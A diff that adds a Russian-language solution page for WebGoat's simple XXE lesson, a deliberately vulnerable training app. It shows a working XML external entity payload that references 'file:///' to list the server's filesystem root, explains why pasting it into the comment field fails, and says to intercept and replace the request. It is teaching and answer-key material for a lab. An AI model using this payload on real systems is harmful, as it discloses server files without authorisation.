@@ -1,0 +1,52 @@
+=== Решение задания
+
+Цель упражнения — перечислить корень файловой системы. Если мы сначала попробуем обычный пост, то увидим следующий запрос:
+
+[source, xml]
+----
+POST /WebGoat/xxe/simple
+Content-Type: application/xml
+
+<?xml version="1.0"?><comment><text>Это мой первый комментарий, хорошая картинка</text></comment>
+----
+
+Веб-страница делает запрос xhr для публикации сообщения xml, после чего комментарий отображается в разделе комментариев. Теперь давайте попробуем немного изменить запрос, как показано в предыдущем разделе:
+
+[source, xml]
+----
+POST /WebGoat/xxe/simple
+Content-Type: application/xml
+
+<?xml version="1.0" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
+----
+
+Поэтому вместо включения конкретного файла мы делаем ссылку на корень файловой системы с помощью `file:///`. Если мы просто скопируем и вставим это в текстовое поле комментария, вы получите ошибку в теле ответа
+
+[source,json]
+----
+{
+  "lessonCompleted" : false,
+  "feedback" : "Sorry the solution is not correct, please try again.",
+  "output" : "...javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,44]\\nMessage: The processing instruction target matching \\\"[xX][mM][lL]\\\" is not allowed.]"
+  "assignment" : "SimpleXXE",
+  "attemptWasMade" : true
+}
+----
+
+Это происходит из-за того, что JavaScript принимает входные данные и создает следующее сообщение:
+
+[source%linenums, xml]
+----
+POST /WebGoat/xxe/simple
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<comment>
+  <text>
+    <?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
+  </text>
+</comment>
+----
+Строка 7 содержит ввод, введенный в текстовое поле, если бы мы использовали форму комментария.
+
+Чтобы решить урок, вам нужно перехватить весь исходящий запрос и заменить все тело решением. Смотрите наши уроки о перехвате HTTP-трафика.
